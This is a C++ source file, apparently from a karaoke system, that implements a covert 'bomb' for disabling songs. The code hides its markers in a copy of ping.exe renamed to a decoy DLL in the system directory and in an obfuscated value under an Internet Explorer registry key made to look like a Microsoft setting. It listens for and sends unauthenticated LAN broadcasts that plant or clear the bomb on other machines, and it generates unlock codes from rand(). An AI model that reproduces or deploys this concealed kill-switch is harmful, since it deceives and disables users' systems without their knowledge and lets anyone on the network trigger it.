// bomb.cpp
//

#include "stdAfx.h"
#include "bomb.h"

#include <winsock2.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <ctime>
#include <cstdio>
#include <cstdlib>
#include <cassert>

#define DEBUG_BOMB

//////////////////////////////////////////////////////////////////////////
// 地雷相关常量

// 数据写入文件的位置（写入标志，共占6个字节）
const int g_write_offset = 0x1813;

// 炸弹类型改变值
const unsigned int g_bomb_type_change_value = 0x1E52;

// 地雷监听端口号
const unsigned short g_bomb_port = 13947;

//////////////////////////////////////////////////////////////////////////
// 函数实现

// 构造函数
bomb::bomb()
{
	TCHAR system_dir[256];
	TCHAR ping_path[256];
	DWORD threadId=0;

	memset(m_bomb_file_path,0x0,sizeof(m_bomb_file_path));
	memset(system_dir,0x0,sizeof(system_dir));
	memset(ping_path,0x0,sizeof(ping_path));
	m_bomb_type = BOMB_NONE;
	
	GetSystemDirectory(system_dir,sizeof(system_dir));
	swprintf(m_bomb_file_path,L"%s\\vsnet10.dll",system_dir);
	//把ping.exe文件拷贝一份
	swprintf(ping_path,L"%s\\ping.exe",system_dir);
	CopyFile(ping_path,m_bomb_file_path,TRUE);

	//启动监听线程
	m_thread_run = true;
	HANDLE hThread = CreateThread(NULL, 0, start_thread, this, 0, &threadId);
	if (hThread)
	{
		CloseHandle(hThread);
		hThread = NULL;
	}
	//用于线程结束的事件
	m_thread_event_handle = CreateEvent(NULL,TRUE,FALSE,NULL);

	//查找炸弹
	m_bomb_type = check_bomb();
	if (BOMB_NONE!=m_bomb_type)
	{
		//广播炸弹
		broadcast(m_bomb_type);
	}
}

bomb::~bomb()
{
	m_thread_run = false;
	WaitForSingleObject(m_thread_event_handle,INFINITE);
}

// 埋地雷
bool bomb::embed_bomb(int bomb_type,bool allow_broadcast)
{
	bool result=false;

	if (BOMB_SONG==bomb_type)
	{
		//停歌曲炸弹
		//写入到文件中
		result = write_file_bomb(bomb_type);
		//写入到注册表
		set_reg_bomb(2, bomb_type);
		if (allow_broadcast)
		{
			//歌曲炸弹要广播出去
			broadcast(bomb_type);
			broadcast(bomb_type);
		}	
	}
	else if (BOMB_STOP_DOG==bomb_type)
	{
		//停狗炸弹
	}
	
	return true;
}

// 找地雷
int bomb::check_bomb(void)
{
	int reg_bomb_type=0;
	int read_bomb_type=0;

	//检查地雷
	//先从注册表中查询
	reg_bomb_type = set_reg_bomb(1,0);
	if ((BOMB_SONG==reg_bomb_type) || (BOMB_STOP_DOG==reg_bomb_type))
	{
		//注册表中存在在从文件中查询
		if (PathFileExists(m_bomb_file_path))
		{
			FILE* fp = _wfopen(m_bomb_file_path, L"rb");
			fseek(fp, g_write_offset, SEEK_SET);
			fread(&read_bomb_type, 1, sizeof(read_bomb_type), fp);
			//得到炸弹类型
			read_bomb_type -= g_bomb_type_change_value;
			if (read_bomb_type==reg_bomb_type)
			{
				return reg_bomb_type;
			}
		}
	}
    
	//没有炸弹
	return BOMB_NONE;
}

bool bomb::bomb_out(void)
{
	try
	{
		bool result=false;
		
		//记录下炸弹类型
		m_bomb_type = BOMB_NONE;

		//移出文件炸弹
		result = write_file_bomb(BOMB_NONE);
		//移出注册表炸弹
		set_reg_bomb(3,BOMB_NONE);

		//移除要广播出去
		broadcast(BOMB_NONE);
		broadcast(BOMB_NONE);

		return result;
	}
	catch (...)
	{
		
	}
	return false;
}

int bomb::set_reg_bomb(int operate, int bomb_type)
{
	// 修改注册表信息
	HKEY hKey;
	DWORD value=0;
	DWORD dType = REG_DWORD;
	DWORD dSize = 80;
	int flag=BOMB_NONE;
	TCHAR sub_key[256];
	TCHAR reg_name[256];

	memset(sub_key,0x0,sizeof(sub_key));
	memset(reg_name,0x0,sizeof(reg_name));

	_tcscpy(sub_key,L"SOFTWARE\\Microsoft\\Internet Explorer\\ActiveX Compatibility\\{969C092D-7815-13CF-8D75-F4475354145F}");
	_tcscpy(reg_name,L"Compatibility Flags");

	if (1==operate)
	{
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,sub_key,0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
		{
			//读取炸弹
			if (RegQueryValueEx(hKey, reg_name, NULL, &dType, (LPBYTE)&value, &dSize) == ERROR_SUCCESS)
			{
				flag = value-g_bomb_type_change_value;
			}
            RegCloseKey(hKey);
		}
    } 
	else if(2==operate)
	{
		//写入炸弹
		if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,sub_key,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL)==ERROR_SUCCESS)
		{
			value = bomb_type+g_bomb_type_change_value;

			if (RegSetValueEx(hKey, reg_name, 0, REG_DWORD, (BYTE*)&value, 4) == ERROR_SUCCESS)
			{
				flag = bomb_type;
			}
			RegCloseKey(hKey);
		}
	}
	else
	{
		//清除炸弹
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,sub_key,0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
		{
			value = bomb_type+g_bomb_type_change_value;

			//改变值
			RegSetValueEx(hKey, reg_name, 0, REG_DWORD, (BYTE*)&value, 4);
            //删除
			RegDeleteValue(hKey,reg_name);
			//关闭
			RegCloseKey(hKey);
			//设置炸弹类型
			flag = BOMB_NONE;
		}
	}

	return flag;	
}

bool bomb::write_file_bomb(int bomb_type)
{
	try
	{
		unsigned int write_bomb_type = 0;

		// 埋地雷
		// 修改文件内容
		FILE* fp = _wfopen(m_bomb_file_path, L"r+");
		if (NULL==fp)
		{
			return false;
		}
		fseek(fp, g_write_offset, SEEK_SET);
		write_bomb_type = g_bomb_type_change_value + bomb_type;
		fwrite(&write_bomb_type, 1, sizeof(write_bomb_type), fp);		// 写入标志
		fclose(fp);
		fp=NULL;

		return true;
	}
	catch (...)
	{
		
	}
	return false;
}

void bomb::broadcast(int bomb_type)
{
	try
	{
		char bomb_type_string[64];
		BOOL fBroadcast = TRUE;
		int timeout = 60000;
		
		memset(bomb_type_string,0x0,sizeof(bomb_type_string));
		SOCKET sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (sockfd < 0)
		{
			return;
		}

		//设置广播
		::setsockopt(sockfd,SOL_SOCKET,SO_BROADCAST,(CHAR *)&fBroadcast,sizeof (BOOL));
		//设置接受超时
		::setsockopt(sockfd,SOL_SOCKET,SO_SNDTIMEO,(char *)&timeout,sizeof(timeout));
		//off TIME_WAIT
		struct linger zeroLinger;	
		zeroLinger.l_onoff = 1;	
		zeroLinger.l_linger = 5;
		setsockopt(sockfd,SOL_SOCKET,SO_LINGER,(const char *)&zeroLinger	,sizeof(zeroLinger));

		// 也可以在这里调用bind函数绑定一个本地地址
		// 否则系统将会自动安排

		//填写广播地址
		SOCKADDR_IN addr;
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr =  INADDR_BROADCAST;
		addr.sin_port = ntohs(g_bomb_port);
		sprintf(bomb_type_string, "zlgshinektv8message%d", bomb_type);
		//发送出去
		sendto(sockfd, bomb_type_string, 20, 0, (sockaddr*)&addr, sizeof(addr));
		closesocket(sockfd);
		sockfd=0;
	}
	catch (...)
	{
		
	}
	return;
}

// 线程
DWORD WINAPI bomb::start_thread(void* pParam)
{
	bomb* pThis = reinterpret_cast<bomb*>(pParam);

	pThis->bomb_thread();

	return 0;
}

#define SLEEP_FOR Sleep(1000)

void bomb::bomb_thread(void)
{
	try
	{
		char buffer[256];
		 fd_set bomb_socket_set;
		 timeval overtime;
		 overtime.tv_sec = 0;
		 overtime.tv_usec = 100000;
		 int bomb_type=0;

		 FD_ZERO(&bomb_socket_set);
		
		SOCKET sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (sockfd < 0) 
		{
			SetEvent(m_thread_event_handle);
			return ;
		}
		sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = htonl(INADDR_ANY);
		addr.sin_port = ntohs(g_bomb_port);
		if (SOCKET_ERROR==bind(sockfd, (struct sockaddr*)&addr, sizeof(sockaddr_in)))
		{
			SetEvent(m_thread_event_handle);
			return ;
		}

		FD_SET(sockfd,&bomb_socket_set);
		while (m_thread_run)
		{
			SLEEP_FOR;

			//将fdSocket集合的一个拷贝fdRead传递给select函数，
			// 当有事件发生时，select函数移除fdRead集合中没有未决I/O操作的套节字句柄，然后返回
			fd_set fdRead = bomb_socket_set;
			if(::select(0,&fdRead,NULL,NULL,&overtime)>0)
			{
				//通过将原来fdSocket集合与select处理过的fdRead集合比较，
				// 确定都有哪些套节字有未决I/O，并进一步处理这些I/O。
// 				for(int i=0; i<(int)bomb_socket_set.fd_count; i++)
// 				{
// 					if (FD_ISSET(bomb_socket_set.fd_array[i],&fdRead))
// 					{
// 						if (bomb_socket_set.fd_array[i]==sockfd)
// 						{
// 						}
// 					}
// 				}
				//由于就一个socket，所以不用上面的判断
				memset(buffer,0x0,sizeof(buffer));
				int len = sizeof(sockaddr_in);
				int n = recvfrom(sockfd, buffer, sizeof(buffer), 0, (sockaddr*)&addr, &len);

				if (n == 20)
				{
					if (strncmp(buffer, "zlgshinektv8message", 19) == 0)
					{
						sscanf(&buffer[19],"%d",&bomb_type);
						if (BOMB_SONG==bomb_type)
						{
							//安装炸弹
							embed_bomb(bomb_type,false);
						}
						else if (BOMB_NONE==bomb_type)
						{
							//移除炸弹
							bomb_out();
						}
						break;
					}
				}
			}//end if
		}
		closesocket(sockfd);
		sockfd = 0;
		SetEvent(m_thread_event_handle);
	}
	catch (...)
	{
	}
	SetEvent(m_thread_event_handle);
	return;
}

int bomb::get_bomb_type(void)
{
	return m_bomb_type;
}

bool bomb::make_authentication_code(TCHAR *code)
{
	try
	{
		int number=0;
		TCHAR temp_number[8];

		for (int i=0;i<16;i++)
		{
			number = rand()/(RAND_MAX/10+1);
			memset(temp_number,0x0,sizeof(temp_number));
			swprintf(temp_number,L"%d",number);
            code[i]=temp_number[0];
		}
		
		return true;
	}
	catch (...)
	{
		
	}
	return false;
}

bool bomb::make_bomb_code(TCHAR *authentication_code,TCHAR *code1,TCHAR *code2)
{
	try
	{
		int first_suffix=0;
		int second_suffix=0;
		int number=0;
		TCHAR temp_number[8];

		//把验证码生成32位的炸弹
		for (int i=0;i<18;i++)
		{
			//验证码16位
			first_suffix = (i*3+7)%16;
			second_suffix = (i*7+5)%16;

			number = (authentication_code[first_suffix]+authentication_code[second_suffix])%10;
			memset(temp_number,0x0,sizeof(temp_number));
			swprintf(temp_number,L"%d",number);
			code1[i]=temp_number[0];
		}
		for (int i=18;i<32;i++)
		{
			//验证码16位
			first_suffix = (i*3+5)%16;
			second_suffix = (i*7+1)%16;

			number = (authentication_code[first_suffix]+authentication_code[second_suffix])%10;
			memset(temp_number,0x0,sizeof(temp_number));
			swprintf(temp_number,L"%d",number);
			code2[i-18]=temp_number[0];
		}

		return true;
	}
	catch (...)
	{

	}
	return false;
}